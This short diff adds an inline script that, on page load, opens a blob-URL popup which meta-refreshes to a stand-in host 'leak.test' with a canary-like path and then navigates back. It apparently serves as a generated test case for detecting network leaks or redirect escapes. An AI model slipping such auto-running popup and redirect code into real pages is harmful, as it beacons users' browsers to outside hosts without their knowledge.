@@ -1,0 +1,11 @@
+<script>
+  window.addEventListener('load', function() {
+    let blob = new Blob([
+      "<!DOCTYPE html><html><head><script>setTimeout(function(){ history.back(); }, 1000);</script>" +
+      "<meta http-equiv='refresh' content='0;url=https://leak.test/GenAI-12-Examples-4o/c1115298/redirect'>" +
+      "</head><body></body></html>"
+    ], { type: 'text/html' });
+    let url = URL.createObjectURL(blob);
+    window.open(url, '_blank');
+  });
+</script>
